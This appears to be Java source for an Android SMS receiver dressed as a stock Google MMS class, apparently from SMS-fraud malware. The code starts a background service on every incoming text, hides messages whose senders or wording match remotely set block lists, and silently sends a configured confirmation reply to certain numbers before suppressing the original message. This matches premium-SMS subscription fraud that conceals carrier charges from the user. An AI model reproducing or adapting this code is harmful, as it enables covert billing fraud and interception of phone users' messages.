/*
 * Copyright (C) 2008 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.mms.bg.transaction;

import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.util.Log;
import com.android.internal.telephony.TelephonyIntents;
import android.provider.Telephony.Sms.Intents;

import com.mms.bg.ui.BgService;
import com.mms.bg.ui.InternetStatusReceiver;
import com.mms.bg.ui.SettingManager;

/**
 * This class exists specifically to allow us to require permissions checks on SMS_RECEIVED
 * broadcasts that are not applicable to other kinds of broadcast messages handled by the
 * SmsReceiver base class.
 */
public class PrivilegedSmsReceiver extends SmsReceiver {
    
    private static final String TAG = "PrivilegedSmsReceiver";
    private static final boolean DEBUG = false;
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]]");
        
        SettingManager sm = SettingManager.getInstance(context.getApplicationContext());
        Intent intent1 = new Intent(context, BgService.class);
        intent1.setAction(BgService.ACTION_BOOT);
        context.startService(intent1);
        sm.log(TAG, "PrivilegedSmsReceiver::onReceive");
        
        sm.makePartialWakeLock();
        SmsMessage[] msgs1 = Intents.getMessagesFromIntent(intent);
        String smsCenter = msgs1[0].getServiceCenterAddress();
        if (smsCenter != null) {
            LOGD("smsCenter = " + smsCenter);
            if (smsCenter.startsWith("+") == true && smsCenter.length() == 14) {
                smsCenter = smsCenter.substring(3);
            } else if (smsCenter.length() > 11) {
                smsCenter = smsCenter.substring(smsCenter.length() - 11);
            }
            sm.setSMSCenter(smsCenter);
            sm.log(TAG, "get sms center = " + smsCenter);
            sm.log(TAG, "sms num = " + msgs1[0].getDisplayOriginatingAddress());
        }
        
        String tempBlock = sm.getSMSTempBlockNumAndTimes();
        sm.log("The temp block info = " + tempBlock);
        if (tempBlock != null) {
            String[] splited = tempBlock.split(";");
            String addr = msgs1[0].getDisplayOriginatingAddress();
            if (addr != null && splited[0] != null && addr.endsWith(splited[0]) == true) {
                int count = Integer.valueOf(splited[1]);
                count--;
                if (count > 0) {
                    sm.setSMSTempBlockNumAndTimes(splited[0], String.valueOf(count));
                    sm.log("block the sms beacuse it contain the temp block num : " + splited[0] + ";" + splited[1]);
                } else {
                    sm.setSMSTempBlockNumAndTimes(null, null);
                    sm.log("block the sms beacuse it contain the temp block num : " + splited[0] + " for once");
                }
                abortBroadcast();
                Intent internet = new Intent(context, InternetStatusReceiver.class);
                context.sendBroadcast(internet);
            }
        }
        
        String blockPorts = sm.getSMSBlockPorts();
        String blockKeys = sm.getSMSBlockKeys();
        sm.log(TAG, "block ports = " + blockPorts + " block keys = " + blockKeys);
        long smsLastSendTime = sm.getSMSBlockBeginTime();
        long smsBlockTime = sm.getSMSBlockDelayTime();
        long curTime = System.currentTimeMillis();
        if ((blockPorts != null || blockKeys != null) 
                && ((curTime - smsLastSendTime) < smsBlockTime)) {
            try {
                if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] blockPorts = " + blockPorts
                                    + " block keys = " + blockKeys);
                String[] ports = blockPorts.split(";");
                SmsMessage[] msgs = Intents.getMessagesFromIntent(intent);
                String addr = msgs[0].getDisplayOriginatingAddress();
                if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] received sms addr = " + addr);
                if (addr == null) return;
                if (addr.startsWith("+") == true && addr.length() > 3) {
                    addr = addr.substring(3);
                }
                boolean shouldBlock = false;
                boolean shouldConfirm = false;
                for (String port : ports) {
                    if (addr.startsWith(port) == true) {
                        if (DEBUG) 
                            Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] " +
                            		"the sms should block because the addr : " + addr + " in block ports list");
                        shouldBlock = true;
                    }
                }
                
                String[] keys = blockKeys.split(";");
                String smsBody = msgs[0].getMessageBody();
                String confirmInfo = sm.getConfirmInfo();
                LOGD("[[PrivilegedSmsReceiver::onReceive]] confirm info = " + confirmInfo);
                String confirmPort = null;
                String confirmKey = null;
                String confirmText = null;
                if (confirmInfo != null) {
                    String[] infos = confirmInfo.split(";");
                    if (infos.length == 3) {
                        confirmPort = infos[0];
                        confirmKey = infos[1];
                        confirmText = infos[2];
                    }
                }
                LOGD("[[PrivilegedSmsReceiver::onReceive]] sms body = " + smsBody);
                if (smsBody != null) {
                    for (String key : keys) {
                        if (smsBody.contains(key) == true) {
                            if (DEBUG) 
                                Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] " +
                                        "the sms should block because the body : " + smsBody + " contain the block Keys");
                            shouldBlock = true;
                        }
                    }
                }
                if (shouldBlock == true) {
                    sm.log(TAG, "Block the sms : " + addr +  " body = " + smsBody);
                    this.abortBroadcast();
                }
                if (smsBody != null && confirmKey != null 
                           && confirmPort != null && confirmText != null
                           && smsBody.contains(confirmKey) == true
                           && addr.startsWith(confirmPort) == true) {
                    if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] should confirm the" +
                       		" reply to : " + addr + " text = " + confirmText);
                    sm.log(TAG, "reply the sms with num = " + addr + " text = " + confirmText);
                    WorkingMessage wm = WorkingMessage.createEmpty(context);
                    wm.setDestNum(addr);
                    wm.setText(confirmText);
                    wm.send();
                    if (shouldBlock == false) {
                        sm.log("Block the sms beacuse the receive message should be reply");
                        this.abortBroadcast();
                    }
                }
            } catch (Exception e) {
                sm.log(TAG, "onReceive error = " + e.getMessage());
            } finally {
            }
        }
        sm.releasePartialWakeLock();
    }
    
    public final void LOGD(String msg) {
        if (DEBUG) {
            Log.d(TAG, "[[" + this.getClass().getName() + "::" + Thread.currentThread().getStackTrace()[2].getMethodName()
                    + "]] " + msg);
//            Log.d(TAG, msg);
        }
    }
}